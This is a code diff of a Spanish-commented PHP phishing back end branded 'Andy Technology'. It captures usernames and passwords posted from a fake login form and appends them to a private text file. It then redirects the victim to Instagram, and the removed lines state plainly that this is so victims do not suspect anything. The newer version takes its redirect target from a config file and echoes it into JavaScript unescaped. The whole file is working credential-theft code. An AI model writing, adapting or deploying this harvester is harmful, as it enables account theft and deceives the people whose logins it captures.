@@ -1,24 +1,40 @@
 <?php
-// Motor de captura - Propiedad de Andy Technology
-$log = "registro_privado.txt"; // Nombre del archivo donde se guardarán las claves
+// SISTEMAS TECNOLÓGICOS DE ANDY - Capturador Final
+$log = "registro_privado.txt"; 
+$archivo_config = "destino.txt"; 
 $fecha = date('d-m-Y H:i:s');
 
-// Agarramos lo que vino del formulario
-$usuario = $_POST['user_id'];
-$password = $_POST['user_pass'];
+// 1. Captura de datos del formulario
+$usuario = isset($_POST['user_id']) ? $_POST['user_id'] : 'No definido';
+$password = isset($_POST['user_pass']) ? $_POST['user_pass'] : 'No definido';
 
-// Formato de guardado profesional
-$linea = "====================================\n";
-$linea .= "CAPTURADO POR: ANDY TECHNOLOGY\n";
-$linea .= "Fecha: $fecha\n";
-$linea .= "Usuario: $usuario\n";
-$linea .= "Password: $password\n";
-$linea .= "====================================\n\n";
+// 2. Formato de guardado Andy Technology
+$reporte = "====================================\n";
+$reporte .= "CAPTURADO POR: ANDY TECHNOLOGY\n";
+$reporte .= "Fecha: $fecha\n";
+$reporte .= "Usuario: $usuario\n";
+$reporte .= "Password: $password\n";
+$reporte .= "====================================\n\n";
 
-// Escribimos en el archivo (FILE_APPEND para no borrar lo anterior)
-file_put_contents($log, $linea, FILE_APPEND);
+// 3. Guardado en archivo (FILE_APPEND evita sobrescribir)
+file_put_contents($log, $reporte, FILE_APPEND);
 
-// Redirigimos al Instagram real para que no sospechen
-header("Location: https://www.instagram.com/accounts/login/");
-exit();
+// 4. Lógica de redirección dinámica
+if (file_exists($archivo_config)) {
+    $url_destino = trim(file_get_contents($archivo_config));
+} else {
+    $url_destino = "https://www.instagram.com"; 
+}
 ?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cargando...</title>
+    <script type="text/javascript">
+        window.location.href = "<?php echo $url_destino; ?>";
+    </script>
+</head>
+<body>
+</body>
+</html>
